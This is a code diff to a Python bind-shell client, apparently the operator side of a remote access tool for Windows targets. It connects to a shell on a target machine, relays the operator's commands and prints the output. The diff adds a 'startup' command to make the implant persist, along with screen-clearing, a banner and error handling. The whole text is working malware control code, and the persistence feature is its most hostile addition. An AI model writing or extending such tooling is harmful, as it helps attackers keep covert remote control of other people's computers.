@@ -1,6 +1,16 @@
 import  socket
 import  argparse
+import os
+from platform import system
 
+def clear():
+    clear = ""
+    if system() == "Windows":
+        clear = "cls"
+    else:
+        clear = "clear"
+    return  clear
+os.system(clear())
 
 def banner():
     ban = """
@@ -51,17 +61,28 @@ def connecttoshell(ip,port):
             elif command == "help":
                 print("""
                 exit ==> stop the bind_shell on your target
+                startup ==> Persist  your Bind_shell
+                clear ==> just clear the screen
+                banner ==> show the banner again
                 """)
+            elif command == "clear":
+                os.system(clear())
 
             elif command == "ls":
                 print("[-] This is Windows Shell use dir -_-")
+            elif command == "startup":
+                s.send("startup".encode())
+                print(s.recv(1024).decode())
             elif command.replace(" ","") == "":
                 print("Type Something -_-")
+            elif command == "banner":
+                print(banner())
 
             else:
                 s.send(command.encode())
                 print(hezkolcay(s))
 
-
-connecttoshell(args.ip,int(args.port))
-
+try:
+    connecttoshell(args.ip,int(args.port))
+except ConnectionError:
+    print("[-] Lost Connection")
